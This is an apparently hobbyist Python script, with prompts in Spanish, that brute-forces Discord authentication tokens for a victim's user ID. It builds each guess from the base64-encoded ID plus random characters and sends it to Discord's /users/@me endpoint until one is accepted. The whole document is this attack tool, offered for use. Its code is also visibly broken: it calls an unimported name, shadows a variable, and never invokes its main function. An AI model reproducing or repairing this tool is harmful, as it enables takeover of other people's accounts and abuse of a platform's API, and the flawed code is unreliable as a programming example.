try:   
  def main():  
    import discord
    import string
    import requests as req
    import datetime
    import random
    import time
    import base64
    from threading import Thread as thr
    import os
    from colorama import Fore
    import discord, os, json
    from discord.ext import commands
    from discord.ext.commands import Bot
    from plyer import notification
    from tkinter import messagebox
    from urllib.request import urlopen, Request

    os.system(f'title Discord Token Brute force By Jank3')

    def discord_bruteforce():
        print(f"ID de la victima:", end=" ")
        id = input()
        if (id.isdigit()):
            if (len(id) == 18):
                idutf8 = id.encode("UTF-8")
                idencode = base64.b64encode(idutf8)
                idencode1 = idencode.decode("UTF-8")
                print(f'ID válida, presione "enter" para iniciar el bruteforce')
                que = input()
                if (que == ""):
                    request_url = "https://discordapp.com/api/v6/users/@me"

                    def check():
                        token = ""
                        while True:
                            try:

                                caracteres = list(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '_'])     
                                token = idencode1 + ('').join(random.choices(caracteres, k=35))

                                headers = {'Authorization': token, 'Content-Type': 'application/json'}  
                                req = requests.get(request_url, headers=headers)

                                if req.status_code == 401:
                                    print(f"[-] Inválido: {token}")

                                elif req.status_code == 200:
                                    print(f"[+] Válido: {token}")
                                    messagebox.showinfo(message=f"¡Token encontrado!", title="Discord Bruteforce By Jank3")
                                    break

                            except KeyboardInterrupt:
                                print("")
                                print(f"Bruteforce terminado")
                                break
                    check()
            else:
                print(f"[$] ID inválida, inténtelo de nuevo")
                q = input()
                if (q == ""):
                    discord_bruteforce()
                else:
                    discord_bruteforce()
        else:
            print(f"[$] ID inválida inténtelo de nuevo")
            q = input()
            if (q == ""):
                discord_bruteforce()
            else:
                discord_bruteforce()
        discord_bruteforce()
except KeyboardInterrupt:
    print("Presionaste Ctrl + C")
